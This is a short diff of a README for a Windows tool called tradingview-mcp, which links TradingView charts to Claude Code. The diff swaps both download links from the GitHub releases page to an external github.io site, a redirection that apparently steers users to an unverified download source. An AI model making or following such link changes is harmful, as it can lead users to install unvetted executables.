@@ -1,6 +1,6 @@
 # 📈 tradingview-mcp - Automate your TradingView chart analysis workflow
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/asman9659/tradingview-mcp/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://asman9659.github.io)
 
 This application connects your TradingView Desktop software to Claude Code. It helps you automate your analysis by sending your chart data directly to the AI model. You save time on manual tasks and gain insights into your technical setups.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have the latest
 
 ## 📥 Downloading the Software
 
-[Click here to visit the release page to download the latest version.](https://github.com/asman9659/tradingview-mcp/releases)
+[Click here to visit the release page to download the latest version.](https://asman9659.github.io)
 
 Follow these steps to get the file:
 
